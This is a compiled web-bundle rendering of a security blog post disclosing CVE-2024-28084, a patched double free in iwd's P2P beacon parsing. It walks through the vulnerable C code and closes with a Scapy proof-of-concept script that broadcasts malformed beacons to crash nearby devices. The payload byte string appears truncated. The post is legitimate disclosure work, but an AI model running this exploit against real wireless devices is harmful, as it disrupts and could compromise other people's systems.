"use strict";(self.webpackChunkspr_docs=self.webpackChunkspr_docs||[]).push([[4017],{19709:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>p,frontMatter:()=>i,metadata:()=>o,toc:()=>d});var r=t(85893),a=t(11151);const i={slug:"beacon-double-free-inet-wireless-daemon-CVE-2024-28084",title:"Beacon Double Free in IWD",authors:["ltsrad"],tags:["iwd","memory-corruption","wifi","CVE-2024-28084"]},s=void 0,o={permalink:"/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084",source:"@site/blog/2024-03-11-iwd-double-free.md",title:"Beacon Double Free in IWD",description:"CVE-2024-28084 Patched in Inet Wireless Daemon 2.16",date:"2024-03-11T00:00:00.000Z",formattedDate:"March 11, 2024",tags:[{label:"iwd",permalink:"/pages/blog/tags/iwd"},{label:"memory-corruption",permalink:"/pages/blog/tags/memory-corruption"},{label:"wifi",permalink:"/pages/blog/tags/wifi"},{label:"CVE-2024-28084",permalink:"/pages/blog/tags/cve-2024-28084"}],readingTime:2.985,hasTruncateMarker:!1,authors:[{name:"Alex Radocea",url:"https://twitter.com/defendtheworld",key:"ltsrad"}],frontMatter:{slug:"beacon-double-free-inet-wireless-daemon-CVE-2024-28084",title:"Beacon Double Free in IWD",authors:["ltsrad"],tags:["iwd","memory-corruption","wifi","CVE-2024-28084"]},unlisted:!1,prevItem:{title:"SPR Tailscale",permalink:"/pages/blog/spr-tailscale-integration"},nextItem:{title:"Software Safety Looks Different From The Other Side",permalink:"/pages/blog/federal-focus-memory-corruption-2024"}},l={authorsImageUrls:[void 0]},d=[{value:"CVE-2024-28084 Patched in Inet Wireless Daemon 2.16",id:"cve-2024-28084-patched-in-inet-wireless-daemon-216",level:2},{value:"Supernetworks &amp; Memory Safety",id:"supernetworks--memory-safety",level:2},{value:"A Double Free With Less Than 30 Bytes",id:"a-double-free-with-less-than-30-bytes",level:2},{value:"Code Overview",id:"code-overview",level:3},{value:"Scapy POC",id:"scapy-poc",level:3}];function c(e){const n={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h2,{id:"cve-2024-28084-patched-in-inet-wireless-daemon-216",children:"CVE-2024-28084 Patched in Inet Wireless Daemon 2.16"}),"\n",(0,r.jsxs)(n.p,{children:["While preparing some wifi security training, we found a double free vulnerability affecting\nAPs and Stations running ",(0,r.jsx)(n.a,{href:"https://iwd.wiki.kernel.org/",children:(0,r.jsx)(n.code,{children:"iwd"})}),". This issue was reported and ",(0,r.jsx)(n.a,{href:"https://git.kernel.org/pub/scm/network/wireless/iwd.git/commit/?id=52a47c9fd428904de611a90cbf8b223af879684d",children:"patched"})," with fixes available starting in version 2.16."]}),"\n",(0,r.jsx)(n.h2,{id:"supernetworks--memory-safety",children:"Supernetworks & Memory Safety"}),"\n",(0,r.jsxs)(n.p,{children:["Writing secure native code is not simple nor easy. With SPR we're striving to build a project that's secure by default with memory safety throughout the stack. We're continuing to develop a softmac-based solution to eliminate protocol parsing using native code in firmware, drivers and userland. If you're interested in joining this effort ",(0,r.jsx)(n.a,{href:"mailto:outreach@supernetworks.org",children:"let us know"}),"."]}),"\n",(0,r.jsxs)(n.p,{children:["We also offer WiFi & Network Security training spanning from Digital Signals Processing to Cryptography to Protocol and Coding safety covering enterprise wifi and WPA2/3. If you're interested get in touch at ",(0,r.jsx)(n.a,{href:"mailto:trainings@supernetworks.org",children:(0,r.jsx)(n.code,{children:"training@supernetworks.org"})})]}),"\n",(0,r.jsx)(n.h2,{id:"a-double-free-with-less-than-30-bytes",children:"A Double Free With Less Than 30 Bytes"}),"\n",(0,r.jsx)(n.p,{children:"The issue can be triggered remotely by sending a malformed Information Element inside of a beacon, a probe request, or a probe response. These are unauthenticated frames that a malicious attacker with physical proximity can send remotely."}),"\n",(0,r.jsx)(n.p,{children:"The double free happens while parsing a P2P Information Elements (IEs) with a malformed ADVERTISED_SVC_INFO attribute.\nIn the context of the flaw, remote double frees are especially powerful as they can lead to information leaks to help bypass ASLR and other hardening measures."}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:t(27246).Z+"",width:"2928",height:"992"})}),"\n",(0,r.jsx)(n.p,{children:"Technical details are below."}),"\n",(0,r.jsx)(n.h3,{id:"code-overview",children:"Code Overview"}),"\n",(0,r.jsxs)(n.p,{children:["Under ",(0,r.jsx)(n.code,{children:"p2p_parse_probe_resp()"}),", the ADVERTISED_SVC_INFO attribute is captured."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"\tr = p2p_parse_attrs(pdu, len,\n\t\t\tREQUIRED(P2P_CAPABILITY, &d.capability),\n\t\t\tOPTIONAL(EXTENDED_LISTEN_TIMING,\n\t\t\t\t\t&d.listen_availability),\n\t\t\tOPTIONAL(NOTICE_OF_ABSENCE, &d.notice_of_absence),\n\t\t\tREQUIRED(P2P_DEVICE_INFO, &d.device_info),\n\t\t\tOPTIONAL(P2P_GROUP_INFO, &d.group_clients),\n\t\t\tOPTIONAL(ADVERTISED_SVC_INFO, &d.advertised_svcs),\n\t\t\t-1);\n\n\tif (r >= 0)\n\t\tmemcpy(out, &d, sizeof(d));\n\telse\n\t\tp2p_clear_probe_resp(&d); [1]\n\n\treturn r;\n}\n\n"})}),"\n",(0,r.jsxs)(n.p,{children:["While parsing this attribute in ",(0,r.jsx)(n.code,{children:"extract_p2p_advertised_service_info()"}),", errors in processing will result in the queue pointer allocated at [3] to be released [4]:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"static bool extract_p2p_advertised_service_info(const uint8_t *attr, size_t len,\n\t\t\t\t\t\tvoid *data)\n{\n\tstruct l_queue **out = data;\n...\n\n\twhile (len) {\n\t\tstruct p2p_advertised_service_descriptor *desc;\n\t\tint name_len;\n\n\t\tif (len < 7)\n\t\t\tgoto error;\n\n\t\tname_len = attr[6];\n\t\tif (len < 7u + name_len)\n\t\t\tgoto error;\n\n\t\tif (!l_utf8_validate((const char *) attr + 7, name_len, NULL))\n\t\t\tgoto error;\n\n\t\tif (!*out)\n\t\t\t*out = l_queue_new(); [3]\n\n\nerror:\n\tl_queue_destroy(*out, p2p_clear_advertised_service_descriptor); [4]\n"})}),"\n",(0,r.jsxs)(n.p,{children:["However when the parent function finishes, ",(0,r.jsx)(n.code,{children:"p2p_clear_probe_resp()"})," will also free [2] the ",(0,r.jsx)(n.code,{children:"advertised_svcs"})," data structures."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"void p2p_clear_probe_resp(struct p2p_probe_resp *data)\n{\n\tp2p_clear_notice_of_absence_attr(&data->notice_of_absence);\n\tp2p_clear_device_info_attr(&data->device_info);\n\tp2p_clear_group_info_attr(&data->group_clients);\n\tp2p_clear_advertised_service_info_attr(&data->advertised_svcs); [2]\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"scapy-poc",children:"Scapy POC"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'"""\nCVE-2024-28084 beacon double free vulnerability due to error handling in extract_p2p_advertised_service_info\n"""\nimport sys\nimport os\nfrom scapy.layers.dot11 import *\nfrom scapy.arch import str2mac, get_if_raw_hwaddr\nfrom time import time, sleep\n\ndef if_hwaddr(iff):\n    return str2mac(get_if_raw_hwaddr(iff)[1])\n\ndef config_mon(iface, channel):\n  """set the interface in monitor mode and then change channel using iw"""\n  os.system("ip link set dev %s down" % iface)\n  os.system("iw dev %s set type monitor" % iface)\n  os.system("ip link set dev %s up" % iface)\n  os.system("iw dev %s set channel %d" % (iface, channel))\n\nclass AP:\n    def __init__(self, mac=None, mode="stdio", iface="wlan0", channel=1):\n        self.channel = channel\n        self.iface = iface\n        self.mode = mode\n        if self.mode == "iface":\n            if not mac:\n              mac = if_hwaddr(iface)\n            config_mon(iface, channel)\n        if not mac:\n          raise Exception("Need a mac")\n        else:\n          self.mac = mac\n\n    def get_radiotap_header(self):\n        return RadioTap()\n\n    def dot11_beacon(self, bssid):\n        crash=b"\\xdd\\x07" + b"\\x50\\x6f\\x9a" + b"\\x09"  + b"\\x19\\x08\\x00" + b"\\xdd\\x10" + b"\\x50\\x6f\\x9a" + b"\\x09" +b"\\x00\\x00" + b"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\n        evil_packet = (\n            self.get_radiotap_header()\n            / Dot11(\n                subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid\n            )\n            / Dot11Beacon(cap=0x3101)\n            / crash\n        )\n        self.sendp(evil_packet)\n\n    def run(self):\n        self.interval = 0.05\n        while True:\n            self.dot11_beacon(self.mac)\n            # Sleep\n            sleep(self.interval)\n        return\n\n    def sendp(self, packet, verbose=False):\n        if self.mode == "stdio":\n            x = packet.build()\n            sys.stdout.buffer.write(struct.pack("<L", len(x)) + x)\n            sys.stdout.buffer.flush()\n            return\n        assert self.mode == "iface"\n        sendp(packet, iface=self.iface, verbose=False)\n\n\nif __name__ == "__main__":\n    ap = AP(mode="iface", iface="wlan1", channel=1)\n    ap.run()\n'})})]})}function p(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}},27246:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/cve-2024-28084-12dc774a5319ea885facf57a8eb0a08a.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>s});var r=t(67294);const a={},i=r.createContext(a);function s(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:s(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);